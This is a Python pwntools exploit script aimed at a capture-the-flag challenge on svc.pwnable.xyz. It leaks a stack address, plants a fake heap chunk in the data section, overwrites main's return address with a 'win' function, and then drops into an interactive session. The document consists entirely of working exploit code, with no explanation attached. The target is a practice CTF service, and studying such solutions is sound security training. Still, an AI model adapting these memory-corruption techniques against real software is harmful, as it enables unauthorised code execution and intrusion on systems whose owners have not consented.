#!/usr/bin/python
from pwn import *
import re
from time import sleep

WIN_FUNC = 0x00400a3e

def write_to_target(target_addr, content) :
    proc.write("1")
    sleep(0.1)
    proc.write(p64(0) + p64(target_addr))

    print proc.readuntil("> ")
    proc.write("3")
    print proc.readuntil("> ")
    proc.writeline("1")
    sleep(0.1)
    proc.write(content)

###############################################

context.terminal = ['tmux', 'splitw', '-v']
proc = remote("svc.pwnable.xyz", 30005)
# proc = process("./challenge")
addr_finder = re.compile("0x[0-9a-f]+")

# Leak stack address
print proc.readuntil("> ")
proc.write("2")
res = proc.readuntil("> ")
print res
ret_of_main_at_stack = int(addr_finder.findall(res)[0], 16) + 0x58
print "0x%x" % ret_of_main_at_stack
# DATA section
origin_addr = 0x00601040 + 0x20

# gdb.attach(proc)
# user_input = raw_input()

print "Writing to fake chunk.."
write_to_target(origin_addr - 0x20, "A" * 0x10 + p64(0x0) + p64(0x51))

print "Write complete!"
print proc.readuntil("> ")
write_to_target(ret_of_main_at_stack, p64(WIN_FUNC) + p64(origin_addr))

# Restore free's argument
print proc.readuntil("> ")
proc.writeline("3")

print proc.readuntil("> ")
proc.writeline("0")

proc.interactive()
